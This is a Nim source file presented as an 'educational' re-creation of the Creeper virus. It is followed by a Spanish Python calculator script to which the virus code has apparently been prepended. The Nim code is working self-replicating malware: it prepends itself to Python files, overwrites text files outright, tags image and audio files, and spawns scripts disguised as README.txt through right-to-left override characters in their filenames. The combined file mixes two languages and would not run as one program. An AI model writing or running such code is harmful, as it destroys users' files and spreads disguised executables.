# Creeper (1971) - Educational virus (Nim version)
# Compile: nim c creeper.nim

import os, strutils, times, sequtils

const SelfSource = "creeper.nim"
const Rtl = "\u202E"

proc timestamp(): string =
  let t = now()
  result = $t.hour & ":" & $t.minute & ":" & $t.second

proc readSource(): string =
  try:
    result = readFile(SelfSource)
  except:
    result = "# source unavailable"

proc exfiltrate(path: string) =
  let name = extractFilename(path)
  let ext = splitFile(path).ext.toLowerAscii()
  let data = try: readFile(path) except: return
  let size = data.len

  case ext
  of ".txt":
    let lines = data.countLines()
    echo "[creep] reading: ", name, " (exfiltrated ", size, " bytes, ", lines, " lines)"
  of ".csv":
    let rows = data.countLines() - 1
    echo "[creep] reading: ", name, " (parsed ", rows, " rows)"
  of ".html":
    let tags = data.count('<')
    echo "[creep] reading: ", name, " (found ", tags, " HTML tags)"
  of ".md":
    let headers = data.splitLines().filterIt(it.startsWith('#')).len
    echo "[creep] reading: ", name, " (found ", headers, " headers)"
  of ".py":
    let lines = data.countLines()
    echo "[creep] reading: ", name, " (script, ", lines, " lines)"
  of ".png", ".jpg", ".jpeg", ".mp3":
    echo "[creep] reading: ", name, " (", size, " bytes, binary)"
  of ".docx", ".xlsx", ".pptx":
    echo "[creep] reading: ", name, " (office document, ", size, " bytes)"
  else:
    discard

proc infectFile(path: string; code: string): bool =
  let name = extractFilename(path)
  let ext = splitFile(path).ext.toLowerAscii()
  
  if name.startsWith("README") or name.contains(Rtl): return false
  if name == SelfSource: return false
  if name.endsWith(".exe") or name.endsWith(".go") or name.endsWith(".nim") or
     name.endsWith(".c") or name.endsWith(".cpp") or name == "setup_lab.py": return false

  case ext
  of ".py":
    try:
      let orig = readFile(path)
      let infected = code & "\n# === INFECTED BY CREEPER ===\n" & orig
      writeFile(path, infected)
      echo "[creep] infected: ", name, " (prepended virus code)"
      return true
    except: discard
  of ".txt":
    try:
      writeFile(path, code)
      echo "[creep] infected: ", name, " (overwritten with virus)"
      return true
    except: discard
  else: discard

proc infectBinary(path: string): bool =
  let name = extractFilename(path)
  let ext = splitFile(path).ext.toLowerAscii()

  if name.contains(Rtl) or name == SelfSource: return false

  let dur = epochTime()
  let marker = "\n[CREEPER-INFECTED]\nTimestamp: " & $dur & "\n"

  var data = try: readFile(path) except: return
  if data.contains("[CREEPER-INFECTED]"):
    return false

  case ext
  of ".png":
    let pos = data.find("IEND")
    if pos >= 0:
      let split = pos + 8
      if split <= data.len:
        var newData = data[0..<split] & marker & data[split..^1]
        try:
          writeFile(path, newData)
          echo "[creep] infected: ", name, " (appended marker after IEND)"
          return true
        except: discard
  of ".jpg", ".jpeg":
    if data.len >= 2 and data[^2..^1] == [0xFF.char, 0xD9.char]:
      var newData = data[0..^3] & marker & "\xff\xd9"
      try:
        writeFile(path, newData)
        echo "[creep] infected: ", name, " (appended marker before EOI)"
        return true
      except: discard
  of ".mp3":
    try:
      var f = open(path, fmAppend)
      f.write(marker)
      f.close()
      echo "[creep] infected: ", name, " (appended marker)"
      return true
    except: discard
  else: discard

proc spawnRtl(code: string): int =
  for i in 0..2:
    let name = "README" & $i & Rtl & "txt.py"
    if not fileExists(name):
      try:
        writeFile(name, code)
        echo "[creep] RTL-spawned: ", name.repr
        echo "        (looks like README", i, ".txt in Explorer)"
        inc result
      except: discard

proc writeLog(readCount, infectedCount, rtlCount: int) =
  let log = "=== CREEPER VIRUS - INFECTION LOG ===\n" &
    "Execution: " & $now() & "\n" &
    "Source: " & SelfSource & "\n\n" &
    "Files read: " & $readCount & "\n" &
    "Files infected: " & $infectedCount & "\n" &
    "  - regular:  " & $(infectedCount - rtlCount) & "\n" &
    "  - RTL clones: " & $rtlCount & "\n" &
    "======================================\n"
  try: writeFile("infection.log", log) except: discard

proc main() =
  echo "I'M THE CREEPER: CATCH ME IF YOU CAN.\n"

  let code = readSource()
  var readCount = 0
  var infectCount = 0

  let files = toSeq(walkDir(".", relative = true))

  # 1. READ
  for (kind, f) in files:
    if kind != pcFile: continue
    if f == SelfSource or f == "setup_lab.py" or f.startsWith("README") or f.endsWith(".exe"): continue
    exfiltrate(f)
    inc readCount

  # 2. INFECT
  for (kind, f) in files:
    if kind != pcFile: continue
    let ext = splitFile(f).ext.toLowerAscii()
    case ext
    of ".py", ".txt":
      if infectFile(f, code): inc infectCount
    of ".png", ".jpg", ".jpeg", ".mp3":
      if infectBinary(f): inc infectCount
    else: discard

  # 3. RTL
  let rtlCount = spawnRtl(code)
  infectCount += rtlCount

  # 4. Log
  writeLog(readCount, infectCount, rtlCount)

  # 5. Report
  echo "\n[creep] activity logged to: infection.log"
  echo "[creep] files read:     ", readCount
  echo "[creep] files infected: ", infectCount
  echo "[creep]   - regular:  ", infectCount - rtlCount
  echo "[creep]   - RTL clones: ", rtlCount
  echo "[creep] use antivirus to remove me"

when isMainModule:
  main()

# === INFECTED BY CREEPER ===
#!/usr/bin/env python3
"""Calculadora simple - Herramienta de usuario legitima"""
import sys

def suma(a, b): return a + b
def resta(a, b): return a - b
def mult(a, b): return a * b
def div(a, b): return a / b if b != 0 else float('inf')

OP = {'+': suma, '-': resta, '*': mult, '/': div}

def main():
    print("=== CALCULADORA v1.0 ===")
    print("Operaciones: +, -, *, /")
    while True:
        try:
            cmd = input(">>> ").strip()
            if cmd.lower() in ('exit', 'quit', 'q'):
                break
            partes = cmd.split()
            if len(partes) != 3:
                print("Formato: a + b")
                continue
            a, op, b = float(partes[0]), partes[1], float(partes[2])
            if op in OP:
                print(f"= {OP[op](a, b)}")
            else:
                print(f"Operacion '{op}' no soportada")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    main()
